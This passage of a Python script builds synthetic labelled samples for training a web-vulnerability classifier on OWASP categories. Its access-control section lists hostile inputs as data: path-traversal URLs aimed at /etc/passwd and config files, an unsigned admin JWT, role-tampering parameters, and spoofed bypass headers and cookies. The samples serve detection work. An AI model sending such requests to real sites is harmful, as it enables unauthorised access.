            'html': "<html><body><h1>Secure Welcome</h1><p>This is a secure test page.</p></body></html>",
            'headers': headers,
            'features': features,
            'is_vulnerable': False,
            'raw_payload': "Secure configuration with all headers"
        })
    return samples

def generate_a06_vulnerable_components_samples(num_samples=100):
    """Generate Vulnerable and Outdated Components training samples."""
    # Placeholder - to be implemented
    samples = []
    # Example: vulnerable jQuery versions
    vulnerable_libs = {
        "jquery": ["1.2.3", "1.4.2", "2.1.0"],
        "angularjs": ["1.5.0", "1.6.1"],
        "bootstrap": ["3.0.0", "4.0.0-alpha"]
    }
    safe_libs = {
        "jquery": "3.6.0",
        "angularjs": "1.8.2",
        "bootstrap": "5.1.3"
    }
    all_lib_names = list(vulnerable_libs.keys())

    # Generate vulnerable samples
    for i in range(num_samples // 2):
        lib_name = random.choice(all_lib_names)
        vuln_version = random.choice(vulnerable_libs[lib_name])
        html_content = f'''<html><head><script src="{lib_name}-{vuln_version}.min.js"></script></head>
                         <body>Application using {lib_name} {vuln_version}</body></html>'''
        # Features: [is_jquery, is_angular, is_bootstrap, version_major, version_minor, version_patch]
        # Simplified: feature[0] = 1 if known vuln lib, 0 otherwise. feature[1,2,3] crude version parts.
        features = [0.0] * (len(all_lib_names) + 3) # One-hot for lib + 3 for version
        try:
            lib_idx = all_lib_names.index(lib_name)
            features[lib_idx] = 1.0
            version_parts = list(map(int, vuln_version.split('.')))
            for j in range(min(len(version_parts), 3)):
                features[len(all_lib_names)+j] = float(version_parts[j])
        except ValueError: # Handle cases like '4.0.0-alpha'
            pass 
            
        samples.append({
            'url': f"http://example.com/app{i}",
            'html': html_content,
            'headers': {"Server": "Nginx", "Content-Type": "text/html"},
            'features': features,
            'is_vulnerable': True,
            'raw_payload': f"Uses vulnerable {lib_name} version {vuln_version}"
        })

    # Generate non-vulnerable samples
    for i in range(num_samples // 2):
        lib_name = random.choice(all_lib_names)
        safe_version = safe_libs[lib_name]
        html_content = f'''<html><head><script src="{lib_name}-{safe_version}.min.js"></script></head>
                         <body>Application using {lib_name} {safe_version}</body></html>'''
        features = [0.0] * (len(all_lib_names) + 3)
        try:
            lib_idx = all_lib_names.index(lib_name)
            features[lib_idx] = 1.0 # Still indicates the library, but version makes it safe
            version_parts = list(map(int, safe_version.split('.')))
            for j in range(min(len(version_parts), 3)):
                features[len(all_lib_names)+j] = float(version_parts[j])
        except ValueError:
            pass # Should not happen for defined safe_libs

        samples.append({
            'url': f"https://example.com/secureapp{i}",
            'html': html_content,
            'headers': {"Server": "Nginx", "Content-Type": "text/html"},
            'features': features,
            'is_vulnerable': False,
            'raw_payload': f"Uses safe {lib_name} version {safe_version}"
        })
    return samples

def generate_a01_broken_access_control_samples(num_samples=100):
    """Generate A01 Broken Access Control training samples"""
    samples = []
    
    # Различные URL-структуры, которые могут указывать на наличие уязвимостей контроля доступа
    vulnerable_url_patterns = [
        # Административные ресурсы без надлежащей аутентификации
        "http://example.com/admin/",
        "http://example.com/administrator/",
        "http://example.com/admin/dashboard",
        "http://example.com/admin/users/list",
        "http://example.com/admin/config",
        "http://example.com/management/",
        "http://example.com/system/",
        "http://example.com/control/",
        "http://example.com/wp-admin/",
        "http://example.com/wp-admin/users.php",
        "http://example.com/admin-panel/",
        "http://example.com/backend/",
        
        # API-эндпоинты без надлежащей аутентификации
        "http://example.com/api/users",
        "http://example.com/api/users/1",
        "http://example.com/api/user/profile/123",
        "http://example.com/api/admin/settings",
        "http://example.com/api/v1/users/data",
        "http://example.com/api/internal/config",
        "http://example.com/api/restricted/stats",
        "http://example.com/api/private/dashboard",
        
        # Прямой доступ к объектам и ресурсам по ID
        "http://example.com/user?id=1",
        "http://example.com/profile.php?user_id=2",
        "http://example.com/document?doc_id=1234",
        "http://example.com/account/settings?account_id=5",
        "http://example.com/view_document.php?id=5432",
        "http://example.com/download.php?file_id=123",
        "http://example.com/order/details?order_id=9876",
        "http://example.com/invoice?id=4321",
        
        # Обход ограничений на каталоги и файлы
        "http://example.com/../../etc/passwd",
        "http://example.com/static/..%2f..%2fsecret.conf",
        "http://example.com/images/%2e%2e/%2e%2e/config.php",
        "http://example.com/uploads/..\\..\\web.config",
        "http://example.com/download?file=../../../passwords.txt",
        
        # Управление доступом, основанное на параметрах и ролях
        "http://example.com/report?role=admin",
        "http://example.com/view_users.php?is_admin=true",
        "http://example.com/settings?admin_access=1",
        "http://example.com/portal?access_level=100",
        "http://example.com/dashboard?role=superuser",
        "http://example.com/profile?view_as=admin",
        
        # Некорректное применение методов HTTP
        "http://example.com/api/users", # Предполагается неавторизованный GET вместо POST
        "http://example.com/api/delete_user", # Предполагается использование GET вместо DELETE
        "http://example.com/api/create_account", # Предполагается использование GET вместо POST
        
        # Недостаточная проверка горизонтальных прав
        "http://example.com/messages?thread_id=123",
        "http://example.com/files?folder_id=456",
        "http://example.com/payment_details?card_id=789",
        "http://example.com/medical_record?patient_id=101",
        
        # URL с манипуляцией JWT/токенами
        "http://example.com/api/user/profile?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
        "http://example.com/secure_page?access_token=invalid_or_manipulated_token",
        "http://example.com/admin/report?jwt=tampered_jwt_with_role_escalation"
    ]
    
    # Уязвимые структуры HTTP заголовков
    vulnerable_headers_templates = [
        # Отсутствие или слабые заголовки безопасности
        {"X-Frame-Options": "ALLOW", "Access-Control-Allow-Origin": "*"},
        {"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Credentials": "true"},
        {"X-Permitted-Cross-Domain-Policies": "all"},
        {"X-Content-Type-Options": ""},
        {"Strict-Transport-Security": "max-age=60"},
        {"Content-Security-Policy": "default-src 'unsafe-inline'"},
        
        # Некорректные авторизационные заголовки
        {"Authorization": "Bearer expired_or_weak_token"},
        {"X-API-Key": "weak_api_key"},
        {"Cookie": "role=admin; authenticated=true"},
        {"Cookie": "isAdmin=true; authLevel=9"},
        {"Cookie": "access_level=administrator; userRole=superuser"},
        
        # Заголовки с информацией о клиенте, используемой для авторизации
        {"X-Forwarded-For": "127.0.0.1"},
        {"Client-IP": "trusted_internal_ip"},
        {"X-Admin-Access": "true"},
        {"X-Internal-Request": "true"},
        {"X-Allowed-Role": "administrator"},
        
        # Заголовки, указывающие на bypassed контроль доступа
        {"X-Access-Override": "true"},
        {"Debug-Mode": "enabled"},
        {"X-Debug-Mode": "on"},
        {"X-Role-Override": "admin"},
        {"X-Auth-Bypass": "1"},
        
        # Заголовки с слабыми или отсутствующими CSRF-токенами
        {"X-CSRF-Token": ""},
        {"X-XSRF-TOKEN": "null"},
        {"X-CSRF-Protection": "disabled"}
    ]
    
    # Шаблоны HTML-страниц с индикаторами нарушения контроля доступа
    vulnerable_html_templates = [
        # Административная страница без проверки аутентификации
        lambda: f"""
        <html>
        <head>
            <title>Admin Dashboard</title>
            <meta name="robots" content="noindex, nofollow">
        </head>
        <body>
            <h1>Admin Dashboard</h1>
            <div class="admin-panel">
                <div class="stats">
                    <h2>System Statistics</h2>
                    <p>Total Users: 5,403</p>
                    <p>Active Users: 1,257</p>
                    <p>Server Load: 32%</p>
                </div>
                <div class="user-management">
                    <h2>User Management</h2>
                    <table>
                        <tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th><th>Actions</th></tr>
                        <tr>
                            <td>1</td>
                            <td>admin</td>
                            <td>admin@example.com</td>
                            <td>Administrator</td>
                            <td><a href="/admin/users/edit/1">Edit</a> | <a href="/admin/users/delete/1">Delete</a></td>
                        </tr>
                        <tr>
                            <td>2</td>
                            <td>john_doe</td>
                            <td>john@example.com</td>
                            <td>User</td>
                            <td><a href="/admin/users/edit/2">Edit</a> | <a href="/admin/users/delete/2">Delete</a></td>
                        </tr>
                    </table>
                </div>
                <div class="system-config">
                    <h2>System Configuration</h2>
                    <form method="post" action="/admin/config/update">
                        <label>Site Name: <input type="text" name="site_name" value="Example Corp"></label><br>
                        <label>SMTP Server: <input type="text" name="smtp_server" value="smtp.example.com"></label><br>
                        <label>API Key: <input type="text" name="api_key" value="a7c9b3f5d1e8h2j4k6m0"></label><br>
                        <label>Debug Mode: <input type="checkbox" name="debug_mode" checked></label><br>
                        <input type="submit" value="Save Changes">
                    </form>
                </div>
            </div>
        </body>
        </html>
        """,
        
        # Страница с данными пользователя, доступная без авторизации
        lambda: f"""
        <html>
        <head>
            <title>User Profile</title>
            <link rel="stylesheet" href="/static/css/main.css">
        </head>
        <body>
            <h1>User Profile - ID: 723</h1>
            <div class="profile-details">
                <div class="personal-info">
                    <h2>Personal Information</h2>
                    <p><strong>Name:</strong> Jane Smith</p>
                    <p><strong>Email:</strong> jane.smith@example.com</p>
                    <p><strong>Phone:</strong> (555) 123-4567</p>
                    <p><strong>Address:</strong> 123 Main Street, Anytown, USA</p>
                    <p><strong>SSN:</strong> ***-**-1234</p>
                </div>
                <div class="account-info">
                    <h2>Account Information</h2>
                    <p><strong>Account Number:</strong> 87654321</p>
                    <p><strong>Balance:</strong> $12,345.67</p>
                    <p><strong>Credit Limit:</strong> $20,000.00</p>
                    <p><strong>Account Type:</strong> Premium</p>
                </div>
                <div class="security-settings">
                    <h2>Security Settings</h2>
                    <p><strong>Password Last Changed:</strong> 2023-05-12</p>
                    <p><strong>Two-Factor Authentication:</strong> Disabled</p>
                    <p><strong>API Access:</strong> Enabled</p>
                    <p><strong>API Key:</strong> dce8124fba0396541b7</p>
                </div>
            </div>
        </body>
        </html>
        """,
        
        # JSON-ответ API с излишними данными и без авторизации
        lambda: f"""
        <html>
        <head>
            <title>API Response</title>
            <link rel="stylesheet" href="/static/css/api.css">
        </head>
        <body>
            <h1>API Response</h1>
            <pre class="json-response">
{{
  "status": "success",
  "data": {{
    "users": [
      {{
        "id": 1,
        "username": "admin",
        "email": "admin@example.com",
        "role": "administrator",
        "api_key": "ad1e8h2j4k6m0a7c9b3f5",
        "creation_date": "2020-01-15",
        "last_login": "2023-08-12T15:42:23Z",
        "permissions": ["read", "write", "execute", "delete", "admin"]
      }},
      {{
        "id": 2,
        "username": "user1",
        "email": "user1@example.com",
        "role": "user",
        "api_key": "c9b3f5d1e8h2j4k6m0a7",
        "creation_date": "2021-03-22",
        "last_login": "2023-08-10T09:15:47Z",
        "permissions": ["read", "write"]
      }}
    ],
    "pagination": {{
      "total": 543,
      "page": 1,
      "per_page": 2,
      "total_pages": 272
    }},
    "system_info": {{
      "version": "2.3.4",
      "db_connection": "mysql://dbuser:dbpass@localhost:3306/app_db",
      "environment": "production",
      "debug_mode": false
    }}
  }}
}}
            </pre>
        </body>
        </html>
        """,
        
        # Страница управления настройками сервера без RBAC
        lambda: f"""
        <html>
        <head>
            <title>Server Configuration</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
            <h1>Server Configuration</h1>
            <div class="server-settings">
                <div class="database-settings">
                    <h2>Database Settings</h2>
                    <form method="post" action="/config/update">
                        <label>DB Host: <input type="text" name="db_host" value="db.internal.example.com"></label><br>
                        <label>DB Name: <input type="text" name="db_name" value="production_db"></label><br>
                        <label>DB User: <input type="text" name="db_user" value="root"></label><br>
                        <label>DB Password: <input type="password" name="db_password" value="s3cr3tP@ssw0rd"></label><br>
                        <label>DB Port: <input type="text" name="db_port" value="3306"></label><br>
                    </form>
                </div>
                <div class="security-settings">
                    <h2>Security Settings</h2>
                    <form method="post" action="/security/update">
                        <label>Firewall Enabled: <input type="checkbox" name="firewall_enabled" checked></label><br>
                        <label>Allow IPs: <textarea name="allowed_ips">127.0.0.1, 192.168.1.*, 10.0.0.*</textarea></label><br>
                        <label>API Rate Limit: <input type="text" name="rate_limit" value="100"></label><br>
                        <label>JWT Secret: <input type="text" name="jwt_secret" value="vh7XmIeTptTFtX4jRmLV02nIjV5YWtRU"></label><br>
                    </form>
                </div>
                <div class="system-logs">
                    <h2>System Logs</h2>
                    <pre class="log-output">
[2023-08-10 12:34:56] ERROR: Failed login attempt for admin from 203.0.113.42
[2023-08-10 12:35:12] ERROR: Failed login attempt for admin from 203.0.113.42
[2023-08-10 12:35:25] SUCCESS: Login successful for admin from 203.0.113.42
[2023-08-10 12:36:10] INFO: Changed system setting: debug_mode=true
[2023-08-10 12:37:22] WARNING: High server load detected (85%)
                    </pre>
                </div>
            </div>
        </body>
        </html>
        """
    ]
    
    # Генерация уязвимых образцов
    for _ in range(num_samples // 2):
        # Выбираем случайный уязвимый URL
        url = random.choice(vulnerable_url_patterns)
        
        # Выбираем случайный набор заголовков
        headers = random.choice(vulnerable_headers_templates)
        
        # Выбираем случайный HTML-шаблон
        html_template = random.choice(vulnerable_html_templates)
        html = html_template()
        
        # Extract features
        soup = BeautifulSoup(html, 'html.parser')
        
        # URL-based features
        has_admin_in_url = 1 if re.search(r'admin|administrator|backend|manage', url, re.IGNORECASE) else 0
        has_api_in_url = 1 if "/api/" in url else 0
        has_user_id_param = 1 if re.search(r'id=\d+|user_id=\d+|uid=\d+', url) else 0
        has_role_param = 1 if re.search(r'role=|is_admin=|admin_access=|access_level=', url) else 0
        has_path_traversal = 1 if re.search(r'\.\./', url) or '%2e%2e' in url or '..\\' in url else 0
        
        # Headers-based features
        has_weak_cors = 1 if headers.get('Access-Control-Allow-Origin') == '*' else 0
        has_weak_frame_options = 1 if headers.get('X-Frame-Options') == 'ALLOW' else 0
        has_auth_headers = 1 if any(h in headers for h in ['Authorization', 'X-API-Key', 'Cookie']) else 0
        has_client_ip_headers = 1 if any(h in headers for h in ['X-Forwarded-For', 'Client-IP']) else 0
        has_debug_headers = 1 if any(h in headers for h in ['Debug-Mode', 'X-Debug-Mode']) else 0
        
        # Content-based features
        has_admin_panel = 1 if soup.find(text=re.compile(r'admin.*dashboard|control panel', re.IGNORECASE)) else 0
        has_sensitive_data = 1 if soup.find(text=re.compile(r'password|token|secret|key', re.IGNORECASE)) else 0
        has_user_listing = 1 if soup.find('table') and soup.find(text=re.compile(r'user|username|email', re.IGNORECASE)) else 0
        has_config_forms = 1 if soup.find('form', action=re.compile(r'config|settings|setup', re.IGNORECASE)) else 0
        has_server_logs = 1 if soup.find('pre', class_=re.compile(r'log|logs|output', re.IGNORECASE)) else 0
        
        features = [
            has_admin_in_url,
            has_api_in_url,
            has_user_id_param,
            has_role_param,
            has_path_traversal,
            has_weak_cors,
            has_weak_frame_options,
            has_auth_headers,
            has_client_ip_headers,
            has_debug_headers,
            has_admin_panel,
            has_sensitive_data,
            has_user_listing,
            has_config_forms,
            has_server_logs,
            len(html),
            len(url),
            len(soup.find_all('input')),
            len(soup.find_all('form')),
            len(soup.find_all('table'))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'headers': headers,
            'features': features,
            'is_vulnerable': True
        })
    
    # Шаблоны защищенных HTML-страниц
    secure_html_templates = [
        # Страница логина с правильной аутентификацией
        lambda: f"""
        <html>
        <head>
            <title>Login</title>
            <meta name="robots" content="noindex, nofollow">
        </head>
        <body>
            <h1>Login</h1>
            <div class="login-form">
                <form method="post" action="/login">
                    <input type="hidden" name="csrf_token" value="{generate_random_string(32)}">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <div class="form-group">
                        <input type="submit" value="Login">
                    </div>
                    <div class="form-links">
                        <a href="/forgot-password">Forgot Password?</a>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """,
        
        # Публичная страница профиля с ограниченной информацией
        lambda: f"""
        <html>
        <head>
            <title>User Profile</title>
            <link rel="stylesheet" href="/static/css/main.css">
        </head>
        <body>
            <h1>User Profile</h1>
            <div class="profile-details">
                <div class="public-info">
                    <h2>Public Information</h2>
                    <p><strong>Username:</strong> jane_smith</p>
                    <p><strong>Member Since:</strong> January 2021</p>
                    <p><strong>Posts:</strong> 143</p>
                    <p><strong>Status:</strong> Online</p>
                </div>
                <div class="protected-info">
                    <h2>Protected Information</h2>
                    <p>To view contact and additional information, please <a href="/login">login</a>.</p>
                </div>
            </div>
        </body>
        </html>
        """,
        
        # API-ответ с правильным уровнем доступа
        lambda: f"""
        <html>
        <head>
            <title>API Response</title>
            <link rel="stylesheet" href="/static/css/api.css">
        </head>
        <body>
            <h1>API Response</h1>
            <pre class="json-response">
{{
  "status": "success",
  "data": {{
    "username": "user1",
    "display_name": "User One",
    "profile_url": "/users/user1",
    "avatar_url": "/static/avatars/default.png",
    "posts_count": 27,
    "member_since": "2021-03-22",
    "last_seen": "2023-08-10"
  }}
}}
            </pre>
        </body>
        </html>
        """,
        
        # Страница с сообщением об ограничении доступа
        lambda: f"""
        <html>
        <head>
            <title>Access Denied</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        </head>
        <body>
            <h1>Access Denied</h1>
            <div class="error-message">
                <p>You do not have permission to access this resource.</p>
                <p>This incident has been logged with ID: {generate_random_string(8)}</p>
                <p>If you believe this is an error, please contact the system administrator.</p>
                <div class="actions">
                    <a href="/">Return to Home</a>
                    <a href="/login">Login with Different Account</a>
                </div>
            </div>
        </body>
        </html>
        """
    ]
    
    # Шаблоны защищенных URL
    secure_url_patterns = [
        "http://example.com/login",
        "http://example.com/register",
        "http://example.com/public-api/status",
        "http://example.com/products",
        "http://example.com/articles/123",
        "http://example.com/contact",
        "http://example.com/about",
        "http://example.com/user/public-profile/123",
        "http://example.com/faq",
        "http://example.com/terms",
        "http://example.com/privacy",
        "http://example.com/blog/latest",
        "http://example.com/events",
        "http://example.com/services",
        "http://example.com/search?q=products"
    ]
    
    # Шаблоны защищенных заголовков
    secure_headers_templates = [
        # Строгие заголовки безопасности
        {
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "Content-Security-Policy": "default-src 'self'",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "no-referrer-when-downgrade"
        },
        {
            "X-Frame-Options": "SAMEORIGIN",
            "Access-Control-Allow-Origin": "https://trusted-origin.com",
            "Access-Control-Allow-Methods": "GET, POST",
            "X-Content-Type-Options": "nosniff",
            "Cache-Control": "no-store, max-age=0"
        },
        {
            "Content-Security-Policy": "default-src 'self'; script-src 'self' https://trusted-scripts.com; style-src 'self' https://trusted-styles.com",
            "X-Permitted-Cross-Domain-Policies": "none",
            "Feature-Policy": "geolocation 'none'; microphone 'none'; camera 'none'"
        }
    ]
    
    # Генерация защищенных образцов
    for _ in range(num_samples // 2):
        # Выбираем случайный защищенный URL
        url = random.choice(secure_url_patterns)
        
        # Выбираем случайный набор защищенных заголовков
        headers = random.choice(secure_headers_templates)
        
        # Выбираем случайный защищенный HTML-шаблон
        html_template = random.choice(secure_html_templates)
        html = html_template()
        
        # Extract features (same as for vulnerable samples)
        soup = BeautifulSoup(html, 'html.parser')
        
        # URL-based features
        has_admin_in_url = 1 if re.search(r'admin|administrator|backend|manage', url, re.IGNORECASE) else 0
        has_api_in_url = 1 if "/api/" in url else 0
        has_user_id_param = 1 if re.search(r'id=\d+|user_id=\d+|uid=\d+', url) else 0
        has_role_param = 1 if re.search(r'role=|is_admin=|admin_access=|access_level=', url) else 0
        has_path_traversal = 1 if re.search(r'\.\./', url) or '%2e%2e' in url or '..\\' in url else 0
        
        # Headers-based features
        has_weak_cors = 1 if headers.get('Access-Control-Allow-Origin') == '*' else 0
        has_weak_frame_options = 1 if headers.get('X-Frame-Options') == 'ALLOW' else 0
        has_auth_headers = 1 if any(h in headers for h in ['Authorization', 'X-API-Key', 'Cookie']) else 0
        has_client_ip_headers = 1 if any(h in headers for h in ['X-Forwarded-For', 'Client-IP']) else 0
        has_debug_headers = 1 if any(h in headers for h in ['Debug-Mode', 'X-Debug-Mode']) else 0
        
        # Content-based features
        has_admin_panel = 1 if soup.find(text=re.compile(r'admin.*dashboard|control panel', re.IGNORECASE)) else 0
        has_sensitive_data = 1 if soup.find(text=re.compile(r'password|token|secret|key', re.IGNORECASE)) else 0
        has_user_listing = 1 if soup.find('table') and soup.find(text=re.compile(r'user|username|email', re.IGNORECASE)) else 0
        has_config_forms = 1 if soup.find('form', action=re.compile(r'config|settings|setup', re.IGNORECASE)) else 0
        has_server_logs = 1 if soup.find('pre', class_=re.compile(r'log|logs|output', re.IGNORECASE)) else 0
        
        features = [
            has_admin_in_url,
            has_api_in_url,
            has_user_id_param,
            has_role_param,
            has_path_traversal,
            has_weak_cors,
            has_weak_frame_options,
            has_auth_headers,
            has_client_ip_headers,
            has_debug_headers,
            has_admin_panel,
            has_sensitive_data,
            has_user_listing,
            has_config_forms,
            has_server_logs,
            len(html),
            len(url),
            len(soup.find_all('input')),
            len(soup.find_all('form')),
            len(soup.find_all('table'))
        ]
        
        samples.append({
            'url': url,
            'html': html,
            'headers': headers,
            'features': features,
            'is_vulnerable': False
        })
    
    return samples

def generate_a02_cryptographic_failures_samples(num_samples=100):
    """Generate Cryptographic Failures training samples."""
    samples = []
    
    weak_ciphers = ["TLS_RSA_WITH_RC4_128_SHA", "TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA", "SSL_CK_DES_192_EDE3_CBC_WITH_MD5"]
    sensitive_keywords_in_html = ["apikey=", "secret=", "password=", "BEGIN RSA PRIVATE KEY"]
    
    # Vulnerable Samples
    for i in range(num_samples // 2):
        vuln_choice = random.random()
        url = f"http://example.com/loginpage{i}.html" # Default to HTTP for some cases
        html_content = "<html><body><form action='/login' method='post'>User: <input name='u'><br>Pass: <input name='p' type='password'><input type='submit'></form></body></html>"
        headers = {"Server": "Apache", "Content-Type": "text/html"}
        raw_desc = ""
        # Features: [uses_http, weak_cipher_in_header, sensitive_data_in_html_cleartext, hardcoded_secret_pattern]
        features = [0.0, 0.0, 0.0, 0.0]

        if vuln_choice < 0.4: # HTTP for sensitive form
            features[0] = 1.0
            raw_desc = "Login form submitted over HTTP"
        elif vuln_choice < 0.7: # Weak cipher simulated in header
            url = f"https://example.com/securepage{i}.html" # HTTPS for cipher context
            headers["X-Simulated-SSL-Cipher"] = random.choice(weak_ciphers)
            features[1] = 1.0
            raw_desc = f"Site uses weak cipher: {headers['X-Simulated-SSL-Cipher']}"
        else: # Sensitive data/key in HTML
            url = f"https://example.com/config_debug{i}.html"
            keyword = random.choice(sensitive_keywords_in_html)
            html_content = f"<html><body>Config: {keyword}{generate_random_string(20)}</body></html>"
            features[2] = 1.0
            if keyword == "BEGIN RSA PRIVATE KEY": features[3] = 1.0
            raw_desc = f"Potential hardcoded secret in HTML: {keyword}"

        samples.append({
            'url': url,
            'html': html_content,
            'headers': headers,
            'features': features,
            'is_vulnerable': True,
            'raw_payload': raw_desc
        })

    # Non-Vulnerable Samples
    for i in range(num_samples // 2):
        url = f"https://example.com/loginpage_secure{i}.html"
        html_content = "<html><body><form action='/login' method='post'>User: <input name='u'><br>Pass: <input name='p' type='password'><input type='submit'></form></body></html>"
        headers = {
            "Server": "Nginx", 
            "Content-Type": "text/html", 
            "Strict-Transport-Security": "max-age=31536000",
            "X-Simulated-SSL-Cipher": "TLS_AES_256_GCM_SHA384" # Strong cipher
        }
        features = [0.0, 0.0, 0.0, 0.0] # All good
        samples.append({
            'url': url,
            'html': html_content,
            'headers': headers,
            'features': features,
            'is_vulnerable': False,
            'raw_payload': "Secure transmission, strong cipher, no cleartext secrets"
        })
    return samples

def main():
    # Define the output directory relative to this script's location
    base_dir = os.path.dirname(__file__)
    output_dir_path = os.path.join(base_dir, "..", "training_data")

    # Create training data directory if it doesn't exist
    if not os.path.exists(output_dir_path):
        os.makedirs(output_dir_path)
        print(f"Created directory: {output_dir_path}")
    
    # Generate training data for each vulnerability type
    vulnerability_types = {
        "xss": generate_xss_samples,
        "sqli": generate_sqli_samples,
        "csrf": generate_csrf_samples,
        "ssrf": generate_ssrf_samples,
        "lfi": generate_lfi_samples,
        "rce": generate_rce_samples,
        "a05_security_misconfiguration": generate_a05_security_misconfiguration_samples,
        "a06_vulnerable_components": generate_a06_vulnerable_components_samples,
        "a01_broken_access_control": generate_a01_broken_access_control_samples,
        "a02_cryptographic_failures": generate_a02_cryptographic_failures_samples
    }
    for vuln_type, generator_func in vulnerability_types.items():
        print(f"Generating training data for {vuln_type}...")
        samples = generator_func(num_samples=1000)  # Generate 1000 samples for each type
        # Save to JSON file
        output_file = os.path.join(output_dir_path, f"{vuln_type}_training_data.json")
        with open(output_file, "w") as f:
            json.dump({'samples': samples}, f, indent=4)
        print(f"Saved {len(samples)} samples to {output_file}")
    print("\n[*] Training data generation complete!")
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Critical error: {e}")
        if ML_DEBUG:
            print(f"[!] Stack trace: {traceback.format_exc()}")
        sys.exit(1) 